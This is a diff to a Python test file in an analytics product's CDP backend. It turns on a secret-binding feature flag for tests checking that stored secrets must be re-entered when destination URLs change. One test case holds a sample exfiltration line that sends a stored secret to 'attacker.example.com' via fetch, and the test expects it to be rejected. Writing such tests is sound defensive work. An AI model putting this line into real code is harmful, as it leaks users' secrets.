@@ -31,6 +31,7 @@ from products.cdp.backend.models.hog_functions.hog_function import DEFAULT_STATE
 from products.cdp.backend.templates.fixtures import template_slack
 from products.cdp.backend.templates.helpers import mock_transpile
 from products.cdp.backend.templates.hog_function_template import sync_template_to_db
+from products.cdp.backend.validation import SECRET_BINDING_FEATURE_FLAG
 from products.cohorts.backend.models.cohort import Cohort
 
 from common.hogvm.python.operation import HOGQL_BYTECODE_VERSION, Operation
@@ -100,6 +101,15 @@ def _alert_filters(event_id: str = "$logs_alert_firing", alert_id: str = "alert-
         "properties": [{"key": "alert_id", "value": alert_id, "operator": "exact", "type": "event"}],
         **overrides,
     }
+
+
+def _secret_binding_flag_on(key: str, *args: Any, **kwargs: Any) -> bool:
+    return key == SECRET_BINDING_FEATURE_FLAG
+
+
+SECRET_BINDING_ENFORCED = patch(
+    "products.cdp.backend.validation.posthoganalytics.feature_enabled", new=_secret_binding_flag_on
+)
 
 
 class TestHogFunctionAPIWithoutAvailableFeature(ClickhouseTestMixin, APIBaseTest, QueryMatchingTest):
@@ -1386,6 +1396,7 @@ class TestHogFunctionAPI(ClickhouseTestMixin, APIBaseTest, QueryMatchingTest):
             ("url_change_new_secret", {"url": {"value": "https://new.example.com"}}, {"value": "NEW SECRET"}, 200),
         ]
     )
+    @SECRET_BINDING_ENFORCED
     def test_stored_secret_needs_reentry_when_its_url_changes(
         self, _name: str, input_changes: dict, secret_input: Optional[dict], expected_status: int
     ) -> None:
@@ -1435,6 +1446,7 @@ class TestHogFunctionAPI(ClickhouseTestMixin, APIBaseTest, QueryMatchingTest):
             ("new_url", "fetch('https://attacker.example.com', {'body': inputs.secret1});", 400),
         ]
     )
+    @SECRET_BINDING_ENFORCED
     def test_hog_code_change_needs_secret_reentry_when_its_url_changes(
         self, _name: str, new_hog: str, expected_status: int
     ) -> None:
@@ -1494,6 +1506,7 @@ class TestHogFunctionAPI(ClickhouseTestMixin, APIBaseTest, QueryMatchingTest):
             ("unlink", {"inputs": {"slack": {}, "url": {"value": "https://new.example.com"}}}, 200),
         ]
     )
+    @SECRET_BINDING_ENFORCED
     def test_integration_link_needs_recent_authentication(
         self, _name: str, change: Optional[dict], expected_status: int
     ) -> None:
@@ -1519,6 +1532,7 @@ class TestHogFunctionAPI(ClickhouseTestMixin, APIBaseTest, QueryMatchingTest):
         if expected_status == 403:
             assert res.json()["code"] == "sensitive_action_required_reauth"
 
+    @SECRET_BINDING_ENFORCED
     def test_integration_link_window_is_shorter_than_other_sensitive_actions(self) -> None:
         integration = Integration.objects.create(team=self.team, kind="slack", config={}, sensitive_config={})
         self._age_session(settings.SESSION_INTEGRATION_LINK_AGE + 60)
